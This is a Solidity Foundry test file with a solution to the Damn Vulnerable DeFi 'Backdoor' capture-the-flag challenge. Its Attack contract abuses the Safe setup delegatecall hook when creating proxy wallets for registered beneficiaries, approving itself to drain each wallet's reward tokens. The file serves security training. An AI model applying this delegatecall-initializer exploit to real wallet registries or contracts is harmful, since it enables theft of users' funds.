// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory, IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        // Deploy the attack contract
        Attack attack = new Attack(address(walletRegistry), address(singletonCopy), address(walletFactory), token, recovery);

        // Call the attack contract to drain the funds
        attack.initiateAttack(users);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract Attack {
    address private immutable WALLET_REGISTRY;
    address private immutable SINGLETON_COPY;
    address private immutable WALLET_FACTORY;
    DamnValuableToken private immutable DVT;
    address public recovery;

    constructor(address walletRegistry, address singletonCopy, address walletFactory, DamnValuableToken dvt, address _recovery) {
        WALLET_REGISTRY = walletRegistry;
        SINGLETON_COPY = singletonCopy;
        WALLET_FACTORY = walletFactory;
        DVT = dvt;
        recovery = _recovery;
    }

    function delegateApprove(address _spender) external {
        DVT.approve(_spender, 10 ether);
    }

    function initiateAttack(address[] memory _beneficiaries) external {
        // For each beneficiary, create a wallet
        for (uint256 i = 0; i < 4; i++) {
            // create a the initializer payload
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector, // selector
                beneficiary,         // beneficiaries
                1,                   // threshold
                address(this),       // to address to make delegate call (this address will be call with the data payload)
                abi.encodeWithSelector(Attack.delegateApprove.selector, address(this)), // data payload to call delegateApprove, this basically will approve 10 ether to this contract
                address(0),          // fallback handler
                0,                   // payment token
                0,                   // payment value
                0                    // payment Receiver
                );

            // create a new wallet onbehalf of the beneficiary
            SafeProxy newProxy = SafeProxyFactory(WALLET_FACTORY).createProxyWithCallback(SINGLETON_COPY, initializer, i, IProxyCreationCallback(WALLET_REGISTRY));
            // finally transfer the tokens to the recovery address
            DVT.transferFrom(address(newProxy), recovery, 10 ether);
        }

    }
}
